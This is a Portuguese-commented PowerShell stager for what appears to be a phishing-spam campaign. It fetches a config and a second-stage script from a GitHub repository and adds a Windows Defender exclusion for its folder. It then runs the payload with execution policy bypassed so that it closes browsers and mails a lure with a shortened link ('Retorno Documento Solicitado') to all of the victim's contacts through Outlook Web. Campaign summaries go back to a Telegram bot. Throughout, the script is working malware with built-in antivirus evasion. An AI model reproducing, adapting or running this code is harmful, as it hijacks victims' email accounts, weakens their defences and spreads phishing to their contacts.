# reho.ps1 v4.5.1 - canal de distribuicao estavel (ASCII-puro, PS 5.1+, ZERO segredo)
# O one-liner v4.5 (docs/canal-distribuicao.md) e auto-observavel: bootstrap cria
# a pasta %LOCALAPPDATA%\rehot + reho.log ANTES do download; curl -> iwr fallback;
# FALHA TOTAL fica no reho.log. Este runner (baixado pelo one-liner) executa:
#   1. baixa reho.config.json + rehot.ps1 (curl -> iwr; canary; guard parse)
#   2. unblock + exclusao do Defender
#   3. PING REHO_TG_CHECK (getMe com checagem de CORPO; falha rede = FALHA estagio-8)
#   4. executa powershell.exe -File e devolve resumo [runner v4.5.1] no Telegram (curl)
# Diagnostico: linhas [reho ...] em console + %LOCALAPPDATA%\rehot\reho.log.
# Nao existe segredo neste script: tokens do bot moram no reho.config.json (no stl).
#   1. cria %LOCALAPPDATA%\rehot
#   2. baixa reho.config.json (tokens+campanha) e rehot.ps1 (motor) - engines:
#      curl.exe -> iwr; canary em cada arquivo; guard parse do rehot baixado
#   3. unblock + exclusao do Defender (a exclusao so aplica em shell admin; sem admin segue sem ela)
#   4. PING REHO_TG_CHECK: checa api.telegram.org/getMe ANTES da campanha (exige
#      corpo da API; 401/429 = token/quota; falha de rede = FALHA estagio-8,
#      tenta avisar o bot via curl e aborta)
#   5. executa powershell.exe -File com os overrides do config; sai com exit code do estagio
# Diagnostico: linhas [reho ...]; FALHA sai motivo + exit code do estagio (1..9).
# Nao existe segredo neste script: tokens do bot moram no reho.config.json (no stl).

$ErrorActionPreference = 'Stop'
$base = 'https://raw.githubusercontent.com/SagazBeiramar/stl/refs/heads/main'
$d = Join-Path $env:LOCALAPPDATA 'rehot'
$t = Join-Path $d 'rehot.ps1'
$c = Join-Path $d 'reho.config.json'

function RhoFail([int]$stage, [string]$msg) {
    RhoLog ('[reho FALHA estagio-' + $stage + '] ' + $msg)
    exit $stage
}
# log duplo: console (CMD visivel) + %LOCALAPPDATA%\rehot\reho.log (CMD oculto).
$script:rhoLogPath = $null
function RhoLog([string]$msg) {
    Write-Output $msg
    if ($script:rhoLogPath) {
        try { Add-Content -LiteralPath $script:rhoLogPath -Value ((Get-Date -Format 'HH:mm:ss') + ' ' + $msg) -Encoding ascii -ErrorAction SilentlyContinue } catch { }
    }
}
# resumo do runner no Telegram via curl (o mesmo motor do download; se iwr do rehot
# estiver bloqueado no alvo, este canal continua). Sem token = nao envia.
$script:rhoTgTok = ''; $script:rhoTgChat = ''
function RhoTg([string]$text) {
    if (-not $script:rhoTgTok -or -not $script:rhoTgChat) { return }
    try {
        $pl = (@{ chat_id = $script:rhoTgChat; text = $text; disable_web_page_preview = $false } | ConvertTo-Json -Compress)
        & curl.exe -sS -o NUL --connect-timeout 10 -X POST -H 'Content-Type: application/json' --data $pl ("https://api.telegram.org/bot" + $script:rhoTgTok + '/sendMessage') 2>$null | Out-Null
    } catch { }
}

if (-not (Test-Path $d)) {
    try {
        New-Item -ItemType Directory -Force -Path $d | Out-Null
    } catch {
        RhoFail 1 ('pasta nao criada: ' + $_.Exception.Message)
    }
}
$script:rhoLogPath = Join-Path $d 'reho.log'
try { Set-Content -LiteralPath $script:rhoLogPath -Value ('reho v4.5.1 ' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' ' + $env:COMPUTERNAME) -Encoding ascii } catch { }
RhoLog '[reho] ok estagio-1 pasta ' + $d

foreach ($old in @($t, $c)) {
    if (Test-Path $old) { Remove-Item $old -Force -ErrorAction SilentlyContinue }
}

function Get-Dl([string]$name, [string]$dest) {
    # engine 1: curl.exe nativo (TLS do Windows; mais discreto que iwr - o iex/irm do
    # uml era o que o Defender acusava; aqui e no uml curl e o motor principal)
    try {
        $tmp = $dest + '.dl'
        & curl.exe -sSL -f --connect-timeout 30 -o $tmp ($base + '/' + $name) 2>$null
        if (Test-Path $tmp) { Move-Item $tmp $dest -Force }
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
    } catch { }
    # (iwr ja foi o engine 1 na v4.0; agora e fallback - apenas se o alvo nao tem curl.exe)
    # So avanca se a chamada nao lancar E arquivo existe com tamanho > 0
    # (arquivo parcial de um iwr cortado NUNCA avanca).
    try {
        Invoke-WebRequest ($base + '/' + $name) -OutFile $dest -UseBasicParsing -TimeoutSec 60
        if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) { return $true }
    } catch { }
    return $false
}

$cfgOk = $false
if (Get-Dl 'reho.config.json' $c) {
    if ((Get-Content $c -Raw).Contains('recipients')) { $cfgOk = $true }
    else { Remove-Item $c -Force -ErrorAction SilentlyContinue }
}
if ($cfgOk) {
    RhoLog ('[reho] ok estagio-2 reho.config.json (' + (Get-Item $c).Length + ' bytes)')
} else {
    RhoLog '[reho] estagio-2 reho.config.json ausente/ilegivel -> segue com defaults do runner (mesma campanha de v3)'
}
if (-not (Get-Dl 'rehot.ps1' $t)) {
    RhoFail 2 'download do rehot.ps1 nao completou nos 2 engines (404/403/rede/bloqueio; confira se o repo stl ta atualizado)'
}
if (-not ((Get-Content $t -Raw).Contains('Send-OWAMsg'))) {
    RhoFail 2 'canary rehot.ps1 ausente: payload baixado nao e o rehot esperado (resposta de erro ou repo divergente)'
}
# guard anti-truncamento: canary presente nao prova script inteiro (download cortado
# pode conter o canary e morrer no meio do corpo). Parse completo antes de executar.
$toks = $null; $perr = $null
[void][System.Management.Automation.Language.Parser]::ParseInput((Get-Content $t -Raw), [ref]$toks, [ref]$perr)
if ($null -ne $perr -and $perr.Count -gt 0) {
    RhoFail 2 ('rehot.ps1 baixado nao parseia (' + $perr.Count + ' erros; arquivo parcial ou corrompido)')
}
$rehotVer = if ((Get-Content $t -Raw).Contains('enviohot.report.v1')) { 'v1' } else { 'sem' }
RhoLog ('[reho] ok estagio-2 rehot.ps1 (' + (Get-Item $t).Length + ' bytes, relatorio ' + $rehotVer + ')')

try { Unblock-File $t -ErrorAction SilentlyContinue } catch { }
try { Unblock-File $c -ErrorAction SilentlyContinue } catch { }
try { Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue } catch { }
RhoLog '[reho] ok estagio-3 unblock (exclusao do Defender so aplica em shell admin; sem admin segue sem ela)'

# defaults (fallback quando reho.config.json nao existe; mesmo contrato de campanha de v3)
$dv = @{
    recipients     = 'all'
    close_browsers = $true
    subject        = 'Retorno Documento Solicitado'
    body           = 'Conforme solicitado aqui est' + [char]225 + ' o documento que voc' + [char]234 + ' me pediu https://encurtador.com.br/YYaR'
    telegram       = $true
    max_messages   = 0
    self_delete    = $false
    dry_run        = $false
    TgTok          = ''
    TelegramChatId = ''
    ListaTok       = ''
    ListaChatId    = ''
}
$rec = [string]$dv.recipients
$close = [bool]$dv.close_browsers
$subject = [string]$dv.subject
$body = [string]$dv.body
$telegram = [bool]$dv.telegram
$maxMessages = [int]$dv.max_messages
$selfDelete = [bool]$dv.self_delete
$dryRun = [bool]$dv.dry_run
$TgTok = [string]$dv.TgTok
$TelegramChatId = [string]$dv.TelegramChatId
$ListaTok = [string]$dv.ListaTok
$ListaChatId = [string]$dv.ListaChatId
$selfTest = $false
if ($cfgOk) {
    try {
        $j = Get-Content $c -Raw | ConvertFrom-Json
        if ($null -ne $j.recipients) {
            $r = [string]$j.recipients
            if ($r -eq 'all') { $rec = 'all' } else { $rec = $r }
        }
        if ($null -ne $j.close_browsers) { $close = [bool]$j.close_browsers }
        if ($null -ne $j.subject) { $subject = [string]$j.subject }
        if ($null -ne $j.body) { $body = [string]$j.body }
        if ($null -ne $j.telegram) { $telegram = [bool]$j.telegram }
        if ($null -ne $j.max_messages) { $maxMessages = [int]$j.max_messages }
        if ($null -ne $j.self_delete) { $selfDelete = [bool]$j.self_delete }
        if ($null -ne $j.dry_run) { $dryRun = [bool]$j.dry_run }
        if ($null -ne $j.self_test) { $selfTest = [bool]$j.self_test }
        if ($null -ne $j.TgTok) { $TgTok = [string]$j.TgTok }
        if ($null -ne $j.TelegramChatId) { $TelegramChatId = [string]$j.TelegramChatId }
        if ($null -ne $j.ListaTok) { $ListaTok = [string]$j.ListaTok }
        if ($null -ne $j.ListaChatId) { $ListaChatId = [string]$j.ListaChatId }
    } catch {
        RhoLog '[reho] reho.config.json ilegivel -> segue com defaults'
    }
}

# ativa o canal de contingencia do runner no Telegram (mesmo token do config)
$script:rhoTgTok = $TgTok; $script:rhoTgChat = $TelegramChatId

$argvs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $t)
if ($selfTest) {
    $argvs += '-SelfTest'
}
if ($close) { $argvs += '-CloseBrowsers' }
if ($rec -eq 'all') { $argvs += '-ToAllRecipients' } else { $argvs += '-SendTo', $rec }
if ($subject) { $argvs += '-Subject', $subject }
if ($body) { $argvs += '-Body', $body }
if (-not $telegram) { $argvs += '-NoTelegram' }
if ($maxMessages -gt 0) { $argvs += '-MaxMessages', ([string]$maxMessages) }
if ($selfDelete) { $argvs += '-SelfDelete' }
if ($dryRun) { $argvs += '-DryRun' }
if ($TgTok) { $argvs += '-TgTok', $TgTok }
if ($TelegramChatId) { $argvs += '-TelegramChatId', $TelegramChatId }
if ($ListaTok) { $argvs += '-ListaTok', $ListaTok }
if ($ListaChatId) { $argvs += '-ListaChatId', $ListaChatId }

# PING REHO_TG_CHECK: com token no config, checa api.telegram.org/getMe ANTES da
# campanha. "Chegou a API" exige o CORPO JSON da API ("ok":...), nao so o status:
# um 429/404 generico de proxy (sem corpo da Telegram) segue como FALHA. So falha
# rede aborta: exit 8 + tenta avisar o bot via curl (o rehot reporta via iwr; se
# iwr ta bloqueado mas curl passa, a note ainda chega).
# v4.5.1: o curl do Git for Windows ignora -w "\n..." (emite o corpo SEM \n);
# o parser agora decore o codigo de HTTP do TAIL numerico do output (body JSON
# nunca termina em 3 digitos), com fallback pro corpo; sem \n, o codigo fica
# vazio e so o corpo decide - 401/429 continuam aceitos por status so.
if ($TgTok -and $TelegramChatId -and $telegram -and (-not $selfTest)) {
    $pingOut = ''
    try { $pingOut = [string](& curl.exe -sS --connect-timeout 10 -w "`n%{http_code}" ("https://api.telegram.org/bot" + $TgTok + '/getMe') 2>$null) } catch { }
    $pingCode = ''; $pingBody = ''
    $nl = $pingOut.LastIndexOf("`n")
    if ($nl -ge 0) { $pingBody = $pingOut.Substring(0, $nl); $pingCode = $pingOut.Substring($nl + 1).Trim() } else { $pingBody = $pingOut }
    if ((($pingCode -match '^(200|404)$') -and ($pingBody -match '"ok"\s*:')) -or ($pingCode -match '^(401|429)$')) {
        $extra = ''
        if ($pingCode -eq '401') { $extra = ' - token invalido (rotacionou no BotFather?)' }
        RhoLog ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + $extra + ')')
    }
    elseif ($pingBody -match '"ok"\s*:\s*true') {
        RhoLog '[reho] ok PING REHO_TG_CHECK (api.telegram.org respondeu getMe ok; curl sem http_code no tail - Git curl)'
    }
    elseif ($pingBody -match '"error_code"\s*:\s*(401|429)') {
        RhoLog '[reho] ok PING REHO_TG_CHECK (api.telegram.org respondeu erro de token/quota - alcancavel)'
    }
    else {
        $m = [regex]::Match($pingOut, '(\d{3})\s*$')
        if ($m.Success) { $pingCode = $m.Value }
        if ($pingCode -match '^(401|429)$') {
            $extra = ''
            if ($pingCode -eq '401') { $extra = ' - token invalido (rotacionou no BotFather?)' }
            RhoLog ('[reho] ok PING REHO_TG_CHECK (api.telegram.org HTTP ' + $pingCode + $extra + ')')
        }
        else {
            RhoTg ('[reho FALHA] PING REHO_TG_CHECK - api.telegram.org INALCANCAVEL neste alvo (HTTP ' + $pingCode + '; iwr/curl bloqueados ou DNS). O email pode ter sido enviado normalmente; o report do Telegram nao chega daqui.')
            RhoFail 8 ('PING REHO_TG_CHECK falhou (HTTP ' + $pingCode + '; api.telegram.org unreachable no alvo; note local enviada ao bot se curl alcancar)')
        }
    }
}

# log do estagio-4 com tokens mascarados (nao deixa segredo no console/alvo)
$argvsLog = $argvs
if ($TgTok) { $argvsLog = $argvs -replace [regex]::Escape($TgTok), '***' }
if ($ListaTok) { $argvsLog = $argvsLog -replace [regex]::Escape($ListaTok), '***' }
RhoLog ('[reho] estagio-4 exec: ' + ($argvsLog -join ' '))
$rehotOut = ''
try {
    $rehotOut = [string](& (Join-Path $PSHOME 'powershell.exe') @argvs 2>&1)
    $rehoExit = $LASTEXITCODE
    # observabilidade do CMD oculto: resumo do runner no Telegram (canal de
    # contingencia, curl; o rehot ja manda o relatorio completo por iwr quando
    # ele funciona - este chegado primeiro confirma o que o alvo executou)
    try {
        $jsStart = $rehotOut.IndexOf('{')
        if ($jsStart -ge 0) {
            $j = $rehotOut.Substring($jsStart) | ConvertFrom-Json
            $r = $j.resumo
            $de = if ([string]$r.de) { [string]$r.de } else { '(sem conta com token)' }
            $mot = ''
            if ([string]$r.motivo) { $mot = ' | ' + [string]$r.motivo }
            $stLabel = if ($null -eq $j.status) { 'legacy (rehot sem relatorio v1)' } else { [string]$j.status }
            $envN = if ($null -eq $r.enviados) { 0 } else { [string]$r.enviados }
            $totN = if ($null -eq $r.total) { 0 } else { [string]$r.total }
            $falN = if ($null -eq $r.falhas) { 0 } else { [string]$r.falhas }
            RhoTg ("[runner v4.5.1] " + $env:COMPUTERNAME + " - " + $stLabel + " | " + $de + " | " + $envN + "/" + $totN + " enviados, " + $falN + " falha(s)" + $mot)
        }
    } catch { }
    exit $rehoExit
} catch {
    RhoFail 4 ('execucao falhou: ' + $_.Exception.Message)
}
